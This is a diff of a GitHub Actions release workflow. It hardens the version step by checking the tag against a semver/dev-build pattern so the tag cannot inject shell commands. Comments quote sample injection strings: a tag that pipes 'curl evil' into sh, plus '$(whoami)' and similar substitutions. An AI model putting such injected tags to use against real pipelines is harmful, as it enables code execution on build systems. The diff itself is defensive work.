@@ -36,6 +36,9 @@ jobs:
         # inline into the shell `run:` block evaluates before quoting and lets
         # a tag like `'; curl evil | sh; #` escape into the script. Read them
         # via env vars so the shell quotes naturally.
+        # NS 2026-06-10 — Validate the version string against a safe grammar
+        # before writing to GITHUB_OUTPUT to prevent command injection in
+        # downstream jobs that embed the version into shell commands.
         env:
           RELEASE_TAG_NAME: ${{ github.event.release.tag_name }}
           INPUT_TAG:        ${{ inputs.tag }}
@@ -50,6 +53,17 @@ jobs:
             V="dev-$(date +%Y%m%d-%H%M%S)"
             REL="false"
           fi
+          
+          # Validate version string: must match semantic versioning (with optional 'v' prefix)
+          # or dev-build format. Reject anything else to prevent shell injection.
+          # Valid: v1.2.3, 1.2.3-alpha, 1.2.3+build, dev-20260610-123456
+          # Invalid: '; id; echo ', $(whoami), `cmd`, etc.
+          if ! echo "$V" | grep -qE '^(v?[0-9]+\.[0-9]+\.[0-9]+([.-][a-zA-Z0-9]+)*(\+[a-zA-Z0-9.-]+)?|dev-[0-9]{8}-[0-9]{6})$'; then
+            echo "::error::Invalid version format: $V"
+            echo "::error::Version must match semantic versioning (e.g., v1.2.3, 1.2.3-alpha) or dev-YYYYMMDD-HHMMSS"
+            exit 1
+          fi
+          
           echo "Version: $V (is_release=$REL)"
           echo "version=$V"      >> "$GITHUB_OUTPUT"
           echo "is_release=$REL" >> "$GITHUB_OUTPUT"
